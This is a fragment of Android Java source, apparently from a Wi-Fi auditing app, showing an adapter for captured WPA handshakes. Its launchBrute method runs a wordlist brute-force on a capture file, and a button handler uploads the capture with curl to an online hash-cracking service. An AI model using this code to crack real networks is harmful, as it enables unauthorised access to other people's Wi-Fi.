package com.opx.demon.handshakes;
...
import com.opx.demon.handshakes.utils.BruteHandshake;
...
public class HandshakesAdapter extends RecyclerView.Adapter<HandshakesAdapter.ViewHolder> {
    ...
    private void launchBrute(ViewHolder h, String path, String finalMac, String wordlistPath) {
        ...
        new Thread(() -> {
            try {
                id++;
                String capRel = path.replace(core.getShareRoot(), "/sdcard/OPX-Demon");
                String wlRel = wordlistPath.replace(core.getShareRoot(), "/sdcard/OPX-Demon");
        ...
        ok.setOnClickListener(v -> {
            ...
            new Thread(() -> {
                ArrayList<String> result = core.customChrootCommand(
                        "curl -s -X POST -F \"email=" + email + "\" -F \"file=@/sdcard/OPX-Demon/captured/" + displayName + "\" https://api.onlinehashcrack.com");
